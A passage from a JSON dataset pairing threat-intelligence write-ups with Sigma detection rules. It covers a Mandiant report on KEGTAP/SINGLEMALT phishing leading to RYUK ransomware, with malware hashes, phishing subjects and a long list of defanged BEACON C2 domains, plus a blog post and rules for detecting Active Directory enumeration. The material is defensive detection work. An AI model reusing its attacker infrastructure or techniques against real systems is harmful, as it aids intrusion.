to maintain persistence*\n\nThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.\n\n- The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: `<Random directory within %APPDATA%> autoupdate#<random number>`.\n- All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.\n\nAlthough it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the `C:\\Windows\\SysWOW64` directory that have a file name matching the following pattern: `<8 random lowercase chars>.exe`. Stacking or sorting on file creation timestamps in the `C:\\Windows\\SysWOW64` directory may also help identify malicious files, as the directory should be mostly static.\n\nPost-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.\n\nThe following are additional strategies that may aid in identifying associated activity:\n\n- Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration, or communication services with a referrer from a Google Docs document.\n- During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.\n- While collecting data used to enable later-stage operations, the attackers commonly leave instances of `ntds.dit` and exports of the SYSTEM and SECURITY registry hives on impacted systems.\n\n## Hardening Strategies\n\nThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.\n\n- Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.\n- Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins. Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.\n- Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.\n- Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that does not have a business categorization.\n- Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.\n\nFor more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of *State of the Hack* for additional information on this threat.\n\n## Campaign Indicators\n\n### Sample Email Subjects / Patterns\n\n- `<(first|last)-name>: Important Information`\n- `<Company Name>`\n- `<Company Name> complaint`\n- `<(first|last)-name>`\n- Agreement cancellation message\n- Agreement suspension notice\n- Contract cancellation reminder\n- FW: `<Name>` Annual Bonus Report is Ready\n- RE: `<(first|last)-name>`: Your Payslip for October\n- RE: `<Company Name>` Employee Survey\n- RE: `<Name>` termination list\n- RE: `<Company Name>` office\n- RE: Urgent `<Company Name>` Employee Internal Survey\n- RE: Working schedule adjustment\n- RE: Your Payslip for September\n\n### Example Malware Family MD5s\n\n- **KEGTAP**\n  - `df00d1192451268c31c1f8568d1ff472`\n- **BEERBOT**\n  - `6c6a2bfa5846fab374b2b97e65095ec9`\n- **SINGLEMALT**\n  - `37aa5690094cb6d638d0f13851be4246`\n- **STILLBOT**\n  - `3176c4a2755ae00f4fffe079608c7b25`\n- **WINEKEY**\n  - `9301564bdd572b0773f105287d8837c4`\n- **CORKBOT**\n  - `0796f1c1ea0a142fc1eb7109a44c86cb`\n\n### Code Signing Certificate CNs\n\n- ARTBUD RADOM SP Z O O\n- BESPOKE SOFTWARE SOLUTIONS LIMITED\n- Best Fud, OOO\n- BlueMarble GmbH\n- CHOO FSP, LLC\n- Company Megacom SP Z O O\n- ESTELLA, OOO\n- EXON RENTAL SP Z O O\n- Geksan LLC\n- GLOBAL PARK HORIZON SP Z O O\n- Infinite Programming Limited\n- James LTH d.o.o.\n- Logika OOO\n- MADAS d.o.o.\n- MUSTER PLUS SP Z O O\n- NEEDCODE SP Z O O\n- Nordkod LLC\n- NOSOV SP Z O O\n- OOO MEP\n- PLAN CORP PTY LTD\n- REGION TOURISM LLC\n- RESURS-RM OOO\n- Retalit LLC\n- Rumikon LLC\n- SNAB-RESURS, OOO\n- TARAT d.o.o.\n- TES LOGISTIKA d.o.o.\n- VAS CO PTY LTD\n- VB CORPORATE PTY. LTD.\n- VITA-DE d.o.o.\n\n## UNC1878 Indicators\n\nA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.\n\n### BEACON C2s\n\n| First Seen | Domain                         |\n| ---------- | ------------------------------ |\n| 12/11/19   | updatemanagir[.]us             |\n| 12/20/19   | cmdupdatewin[.]com             |\n| 12/26/19   | scrservallinst[.]info          |\n| 1/10/20    | winsystemupdate[.]com          |\n| 1/11/20    | jomamba[.]best                 |\n| 1/13/20    | updatewinlsass[.]com           |\n| 1/16/20    | winsysteminfo[.]com            |\n| 1/20/20    | livecheckpointsrs[.]com        |\n| 1/21/20    | ciscocheckapi[.]com            |\n| 1/28/20    | timesshifts[.]com              |\n| 1/29/20    | cylenceprotect[.]com           |\n| 1/30/20    | sophosdefence[.]com            |\n| 1/30/20    | taskshedulewin[.]com           |\n| 1/30/20    | windefenceinfo[.]com           |\n| 1/30/20    | lsasswininfo[.]com             |\n| 1/30/20    | update-wind[.]com              |\n| 1/30/20    | lsassupdate[.]com              |\n| 1/30/20    | renovatesystem[.]com           |\n| 1/31/20    | updatewinsoftr[.]com           |\n| 2/2/20     | cleardefencewin[.]com          |\n| 2/2/20     | checkwinupdate[.]com           |\n| 2/2/20     | havesetup[.]net                |\n| 2/3/20     | update-wins[.]com              |\n| 2/3/20     | conhostservice[.]com           |\n| 2/4/20     | microsoftupdateswin[.]com      |\n| 2/4/20     | iexploreservice[.]com          |\n| 2/12/20    | avrenew[.]com                  |\n| 2/12/20    | target-support[.]online        |\n| 2/12/20    | web-analysis[.]live            |\n| 2/14/20    | freeallsafe[.]com              |\n| 2/17/20    | windefens[.]com                |\n| 2/17/20    | defenswin[.]com                |\n| 2/17/20    | easytus[.]com                  |\n| 2/17/20    | greattus[.]com                 |\n| 2/17/20    | livetus[.]com                  |\n| 2/17/20    | comssite[.]com                 |\n| 2/17/20    | findtus[.]com                  |\n| 2/17/20    | bigtus[.]com                   |\n| 2/17/20    | aaatus[.]com                   |\n| 2/17/20    | besttus[.]com                  |\n| 2/17/20    | firsttus[.]com                 |\n| 2/17/20    | worldtus[.]com                 |\n| 2/26/20    | freeoldsafe[.]com              |\n| 2/26/20    | serviceupdates[.]net           |\n| 2/26/20    | topserviceupdater[.]com        |\n| 2/27/20    | myserviceupdater[.]com         |\n| 2/29/20    | myservicebooster[.]net         |\n| 2/29/20    | servicesbooster[.]org          |\n| 2/29/20    | brainschampions[.]com          |\n| 2/29/20    | myservicebooster[.]com         |\n| 2/29/20    | topservicesbooster[.]com       |\n| 2/29/20    | servicesbooster[.]com          |\n| 2/29/20    | topservicesecurity[.]org       |\n| 2/29/20    | topservicesecurity[.]net       |\n| 2/29/20    | topsecurityservice[.]net       |\n| 2/29/20    | myyserviceupdater[.]com        |\n| 2/29/20    | topservicesupdate[.]com        |\n| 2/29/20    | topservicesecurity[.]com       |\n| 2/29/20    | servicesecurity[.]org          |\n| 2/29/20    | myserviceconnect[.]net         |\n| 3/2/20     | topservicesupdates[.]com       |\n| 3/2/20     | yoursuperservice[.]com         |\n| 3/2/20     | topservicehelper[.]com         |\n| 3/2/20     | serviceuphelper[.]com          |\n| 3/2/20     | serviceshelpers[.]com          |\n| 3/2/20     | boostsecuritys[.]com           |\n| 3/3/20     | hakunamatatata[.]com           |\n| 3/8/20     | service-updater[.]com          |\n| 3/9/20     | secondserviceupdater[.]com     |\n| 3/9/20     | twelvethserviceupdater[.]com   |\n| 3/9/20     | twentiethservicehelper[.]com   |\n| 3/9/20     | twelfthservicehelper[.]com     |\n| 3/9/20     | tenthservicehelper[.]com       |\n| 3/9/20     | thirdserviceupdater[.]com      |\n| 3/9/20     | thirdservicehelper[.]com       |\n| 3/9/20     | tenthserviceupdater[.]com      |\n| 3/9/20     | thirteenthservicehelper[.]com  |\n| 3/9/20     | seventeenthservicehelper[.]com |\n| 3/9/20     | sixteenthservicehelper[.]com   |\n| 3/9/20     | sixthservicehelper[.]com       |\n| 3/9/20     | seventhservicehelper[.]com     |\n| 3/9/20     | seventhserviceupdater[.]com    |\n| 3/9/20     | sixthserviceupdater[.]com      |\n| 3/9/20     | secondservicehelper[.]com      |\n| 3/9/20     | ninthservicehelper[.]com       |\n| 3/9/20     | ninethserviceupdater[.]com     |\n| 3/9/20     | fourteenthservicehelper[.]com  |\n| 3/9/20     | fourthserviceupdater[.]com     |\n| 3/9/20     | firstserviceupdater[.]com      |\n| 3/9/20     | firstservisehelper[.]com       |\n| 3/9/20     | fifthserviceupdater[.]com      |\n| 3/9/20     | eleventhserviceupdater[.]com   |\n| 3/9/20     | fifthservicehelper[.]com       |\n| 3/9/20     | fourservicehelper[.]com        |\n| 3/9/20     | eighthservicehelper[.]com      |\n| 3/9/20     | eighteenthservicehelper[.]com  |\n| 3/9/20     | eighthserviceupdater[.]com     |\n| 3/9/20     | fifteenthservicehelper[.]com   |\n| 3/9/20     | nineteenthservicehelper[.]com  |\n| 3/9/20     | eleventhservicehelper[.]com    |\n| 3/14/20    | thirdservice-developer[.]com   |\n| 3/14/20    | fifthservice-developer[.]com   |\n| 3/15/20    | firstservice-developer[.]com   |\n| 3/16/20    | fourthservice-developer[.]com  |\n| 3/16/20    | ninethservice-developer[.]com  |\n| 3/16/20    | seventhservice-developer[.]com |\n| 3/16/20    | secondservice-developer[.]com  |\n| 3/16/20    | sixthservice-developer[.]com   |\n| 3/16/20    | tenthservice-developer[.]com   |\n| 3/16/20    | eithtservice-developer[.]com   |\n| 3/17/20    | servicedupdater[.]com          |\n| 3/17/20    | service-updateer[.]com         |\n| 3/19/20    | sexyservicee[.]com             |\n| 3/19/20    | serviceboostnumberone[.]com    |\n| 3/19/20    | servicedbooster[.]com          |\n| 3/19/20    | service-hunter[.]com           |\n| 3/19/20    | servicedhunter[.]com           |\n| 3/19/20    | servicedpower[.]com            |\n| 3/19/20    | sexycservice[.]com             |\n| 3/23/20    | yourserviceupdater[.]com       |\n| 3/23/20    | top-serviceupdater[.]com       |\n| 3/23/20    | top-servicebooster[.]com       |\n| 3/23/20    | serviceshelps[.]com            |\n| 3/23/20    | servicemonsterr[.]com          |\n| 3/23/20    | servicehunterr[.]com           |\n| 3/23/20    | service-helpes[.]com           |\n| 3/23/20    | servicecheckerr[.]com          |\n| 3/23/20    | newservicehelper[.]com         |\n| 3/23/20    | huntersservice[.]com           |\n| 3/23/20    | helpforyourservice[.]com       |\n| 3/23/20    | boostyourservice[.]com         |\n| 3/26/20    | developmasters[.]com           |\n| 3/26/20    | actionshunter[.]com            |\n| 5/4/20     | info-develop[.]com             |\n| 5/4/20     | ayechecker[.]com               |\n| 5/4/20     | service-booster[.]com          |\n| 9/18/20    | zapored[.]com                  |\n| 9/22/20    | gtrsqer[.]com                  |\n| 9/22/20    | chalengges[.]com               |\n| 9/22/20    | caonimas[.]com                 |\n| 9/22/20    | hakunaman[.]com                |\n| 9/22/20    | getinformationss[.]com         |\n| 9/22/20    | nomadfunclub[.]com             |\n| 9/22/20    | harddagger[.]com               |\n| 9/22/20    | errvghu[.]com                  |\n| 9/22/20    | reginds[.]com                  |\n| 9/22/20    | gameleaderr[.]com              |\n| 9/22/20    | razorses[.]com                 |\n| 9/22/20    | vnuret[.]com                   |\n| 9/22/20    | regbed[.]com                   |\n| 9/22/20    | bouths[.]com                   |\n| 9/23/20    | ayiyas[.]com                   |\n| 9/23/20    | serviceswork[.]net             |\n| 9/23/20    | moonshardd[.]com               |\n| 9/23/20    | hurrypotter[.]com              |\n| 9/23/20    | biliyilish[.]com               |\n| 9/23/20    | blackhoall[.]com               |\n| 9/23/20    | checkhunterr[.]com             |\n| 9/23/20    | daggerclip[.]com               |\n| 9/23/20    | check4list[.]com               |\n| 9/24/20    | chainnss[.]com                 |\n| 9/29/20    | hungrrybaby[.]com              |\n| 9/30/20    | martahzz[.]com                 |\n| 10/1/20    | jonsonsbabyy[.]com             |\n| 10/1/20    | wondergodst[.]com              |\n| 10/1/20    | zetrexx[.]com                  |\n| 10/1/20    | tiancaii[.]com                 |\n| 10/1/20    | cantliee[.]com                 |\n| 10/1/20    | realgamess[.]com               |\n| 10/1/20    | maybebaybe[.]com               |\n| 10/1/20    | saynoforbubble[.]com           |\n| 10/1/20    | chekingking[.]com              |\n| 10/1/20    | rapirasa[.]com                 |\n| 10/1/20    | raidbossa[.]com                |\n| 10/1/20    | mountasd[.]com                 |\n| 10/1/20    | puckhunterrr[.]com             |\n| 10/1/20    | pudgeee[.]com                  |\n| 10/1/20    | loockfinderrs[.]com            |\n| 10/1/20    | lindasak[.]com                 |\n| 10/1/20    | bithunterr[.]com               |\n| 10/1/20    | voiddas[.]com                  |\n| 10/1/20    | sibalsakie[.]com               |\n| 10/1/20    | giveasees[.]com                |\n| 10/1/20    | shabihere[.]com                |\n| 10/1/20    | tarhungangster[.]com           |\n| 10/1/20    | imagodd[.]com                  |\n| 10/1/20    | raaidboss[.]com                |\n| 10/1/20    | sunofgodd[.]com                |\n| 10/1/20    | rulemonster[.]com              |\n| 10/1/20    | loxliver[.]com                 |\n| 10/1/20    | servicegungster[.]com          |\n| 10/1/20    | kungfupandasa[.]com            |\n| 10/2/20    | check1domains[.]com            |\n| 10/5/20    | sweetmonsterr[.]com            |\n| 10/5/20    | qascker[.]com                  |\n| 10/7/20    | remotessa[.]com                |\n| 10/7/20    | cheapshhot[.]com               |\n| 10/7/20    | havemosts[.]com                |\n| 10/7/20    | unlockwsa[.]com                |\n| 10/7/20    | sobcase[.]com                  |\n| 10/7/20    | zhameharden[.]com              |\n| 10/7/20    | mixunderax[.]com               |\n| 10/7/20    | bugsbunnyy[.]com               |\n| 10/7/20    | fastbloodhunter[.]com          |\n| 10/7/20    | serviceboosterr[.]com          |\n| 10/7/20    | servicewikii[.]com             |\n| 10/7/20    | secondlivve[.]com              |\n| 10/7/20    | quwasd[.]com                   |\n| 10/7/20    | luckyhunterrs[.]com            |\n| 10/7/20    | wodemayaa[.]com                |\n| 10/7/20    | hybriqdjs[.]com                |\n| 10/7/20    | gunsdrag[.]com                 |\n| 10/7/20    | gungameon[.]com                |\n| 10/7/20    | servicemount[.]com             |\n| 10/7/20    | servicesupdater[.]com          |\n| 10/7/20    | service-boosterr[.]com         |\n| 10/7/20    | serviceupdatter[.]com          |\n| 10/7/20    | dotmaingame[.]com              |\n| 10/12/20   | backup1service[.]com           |\n| 10/13/20   | bakcup-monster[.]com           |\n| 10/13/20   | bakcup-checker[.]com           |\n| 10/13/20   | backup-simple[.]com            |\n| 10/13/20   | backup-leader[.]com            |\n| 10/13/20   | backup-helper[.]com            |\n| 10/13/20   | service-checker[.]com          |\n| 10/13/20   | nasmastrservice[.]com          |\n| 10/14/20   | service-leader[.]com           |\n| 10/14/20   | nas-simple-helper[.]com        |\n| 10/14/20   | nas-leader[.]com               |\n| 10/14/20   | boost-servicess[.]com          |\n| 10/14/20   | elephantdrrive[.]com           |\n| 10/15/20   | service-hellper[.]com          |\n| 10/16/20   | top-backuphelper[.]com         |\n| 10/16/20   | best-nas[.]com                 |\n| 10/16/20   | top-backupservice[.]com        |\n| 10/16/20   | bestservicehelper[.]com        |\n| 10/16/20   | backupnas1[.]com               |\n| 10/16/20   | backupmastter[.]com            |\n| 10/16/20   | best-backup[.]com              |\n| 10/17/20   | viewdrivers[.]com              |\n| 10/19/20   | topservicebooster[.]com        |\n| 10/19/20   | topservice-masters[.]com       |\n| 10/19/20   | topbackupintheworld[.]com      |\n| 10/19/20   | topbackup-helper[.]com         |\n| 10/19/20   | simple-backupbooster[.]com     |\n| 10/19/20   | top3-services[.]com            |\n| 10/19/20   | backup1services[.]com          |\n| 10/21/20   | backupmaster-service[.]com     |\n| 10/21/20   | backupmasterservice[.]com      |\n| 10/21/20   | service1updater[.]com          |\n| 10/21/20   | driverdwl[.]com                |\n| 10/21/20   | backup1master[.]com            |\n| 10/21/20   | boost-yourservice[.]com        |\n| 10/21/20   | checktodrivers[.]com           |\n| 10/21/20   | backup1helper[.]com            |\n| 10/21/20   | driver1updater[.]com           |\n| 10/21/20   | driver1master[.]com            |\n| 10/23/20   | view-backup[.]com              |\n| 10/23/20   | top3servicebooster[.]com       |\n| 10/23/20   | servicereader[.]com            |\n| 10/23/20   | servicehel[.]com               |\n| 10/23/20   | driver-boosters[.]com          |\n| 10/23/20   | service1update[.]com           |\n| 10/23/20   | service-hel[.]com              |\n| 10/23/20   | driver1downloads[.]com         |\n| 10/23/20   | service1view[.]com             |\n| 10/23/20   | backups1helper[.]com           |\n| 10/25/20   | idriveview[.]com               |\n| 10/26/20   | debug-service[.]com            |\n| 10/26/20   | idrivedwn[.]com                |\n| 10/28/20   | driverjumper[.]com             |\n| 10/28/20   | service1boost[.]com            |\n| 10/28/20   | idriveupdate[.]com             |\n| 10/28/20   | idrivehepler[.]com             |\n| 10/28/20   | idrivefinder[.]com             |\n| 10/28/20   | idrivecheck[.]com              |\n| 10/28/20   | idrivedownload[.]com           |\n\n---\n\nPosted in Threat Intelligence, Security & Identity",
    "sigma_rule": {
      "title": "WINEKEY Registry Modification",
      "id": "b98968aa-dbc0-4a9c-ac35-108363cbf8d5",
      "status": "test",
      "description": "Detects potential malicious modification of run keys by winekey or team9 backdoor",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "omkar72",
      "date": "2020-10-30",
      "modified": "2021-11-27",
      "tags": [
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr"
        },
        "condition": "selection"
      },
      "fields": [
        "ComputerName",
        "Image",
        "EventType",
        "TargetObject"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_runkey_winekey.yml"
  },
  "48": {
    "url": "https://web.archive.org/web/20230329163438/https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html",
    "markdown": "# Threat Hunting #5 - Detecting enumeration of users via Net.exe or Net1.exe utility\n\nDetecting an attacker during the reconnaissance phase is very important, because if he/she is at this stage, it means she/he already bypassed all your peripheral and endpoint standard security solutions. If you can detect and stop him at this stage then good for you!\n\nMicrosoft Net.exe utility can be used to enumerate local and domain users and groups [a must to do for any attacker trying to get answers for who/where/what/etc. to complete the objectives].\n\nFamous detection techniques for users enumeration with the net.exe utility are limited to processes's command line value and process name verification (i.e. process_name:net.exe and/or commandLine:.*net.*users.*). which is a vulnerable/weak detection and can be bypassed by simply renaming the process name or introducing special obfuscation characters in the command line (i.e. ^, set x, environment variables etc.)\n\nIn this post we will be using event ID 4661 to detect enumeration attempts of known privileged AD accounts/groups:\n\n- Enterprise Admins\n- Domain Admins\n- Administrators group\n- Administrator\n- etc\n\nBelow an example of \"Domain Admins\" group enumeration:\n\n```image\nAlt: Domain Admins Group Enumeration\nDescription: The image displays a screenshot of an Event Viewer window showing the details of Event ID 4661, which is related to security events in Windows. On the left side, the general properties of the event are listed, highlighting the event type, account name, and security identifier (SID). On the right side, a command line interface (CLI) window is open, showing the output of a command executed in relation to user enumeration. This image serves as an illustrative example of the detection method for user enumeration attacks using the Net.exe utility, providing context for understanding how to monitor and respond to such security events.\nTranscription: |\n  Event Properties - Event 4661, Microsoft Windows security auditing\n  \n  General\n  - Event ID: 4661\n  - Account Name: Administrator\n  - Account Domain: DOMAIN\n  - Security ID: S-1-5-21-1234567890-123456789-1234567890-500\n  - Object Type: Security Descriptor\n  - Object Name: CN=Domain Admins,CN=Users,DC=domain,DC=com\n  - Access Mask: 0x1\n  - Accesses: Read Property\n  - Status: Kb rights revoked.\n  - Process Name: C:\\Windows\\System32\\cmd.exe\n  - Process ID: 1234\n  - User Name: DOMAIN\\Administrator\n  \n  Command Prompt Output:\n  C:\\> net localgroup \"Domain Admins\"\n  The command completed successfully.\n```\n\nYou will need to enable this event on all your domain controllers (expected target for any domain user enumeration). Note that this method can also detect user enumeration with other utilities/tools.\n\n**Detection Logic:**\n\nLook for event 4661 with Message body containing known AD privileged groups/accounts SID values. Example of IBM Qradar AQL query:\n\n```\nselect \"SourceUserName\", \"ObjectType\", \"ObjectName\" from events where \"EventID\"=4661 and not (SourceUserName IMATCHES '.*\\$') and (UTF8(payload) IMATCHES '.*S-1-5-21-.*-(512|502|500|505|519|520|544|551|555).*') last 180 DAYS\n```\n\n**References:**\n\n- Well-known security identifiers in Windows operating systems\n- Event ID 4661\n\n---\n\n**Posted by** MENASEC at 22:45 on Wednesday, 6 February 2019\n\n**Labels:** 4661, SAM_GROUP, SAM_USER, User Enumeration",
    "sigma_rule": {
      "title": "AD Privileged Users or Groups Reconnaissance",
      "id": "35ba1d85-724d-42a3-889f-2e2362bcaf23",
      "status": "test",
      "description": "Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs",
      "references": [
        "https://web.archive.org/web/20230329163438/https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html"
      ],
      "author": "Samir Bousseaden",
      "date": "2019-04-03",
      "modified": "2022-07-13",
      "tags": [
        "attack.discovery",
        "attack.t1087.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: enable Object Access SAM on your Domain Controllers"
      },
      "detection": {
        "selection": {
          "EventID": 4661,
          "ObjectType": [
            "SAM_USER",
            "SAM_GROUP"
          ]
        },
        "selection_object": [
          {
            "ObjectName|endswith": [
              "-512",
              "-502",
              "-500",
              "-505",
              "-519",
              "-520",
              "-544",
              "-551",
              "-555"
            ]
          },
          {
            "ObjectName|contains": "admin"
          }
        ],
        "filter": {
          "SubjectUserName|endswith": "$"
        },
        "condition": "selection and selection_object and not filter"
      },
      "falsepositives": [
        "If source account name is not an admin then its super suspicious"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_account_discovery.yml"
  },
  "49": {
    "url": "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Computer Discovery And Export Via Get-ADComputer Cmdlet",
      "id": "435e10e4-992a-4281-96f3-38b11106adde",
      "related": [
        {
          "id": "db885529-903f-4c5d-9864-28fe199e6370",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Get-ADComputer cmdlet to collect computer information and output it to a file",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
        "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-10",
      "modified": "2022-11-17",
      "tags": [
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "Get-ADComputer ",
            " -Filter \\*"
          ],
          "CommandLine|contains": [
            " > ",
            " | Select ",
            "Out-File",
            "Set-Content",
            "Add-Content"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate admin scripts may use the same technique, it's better to exclude specific computers or users who execute these commands or scripts often"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_computer_discovery_get_adcomputer.yml"
  }
}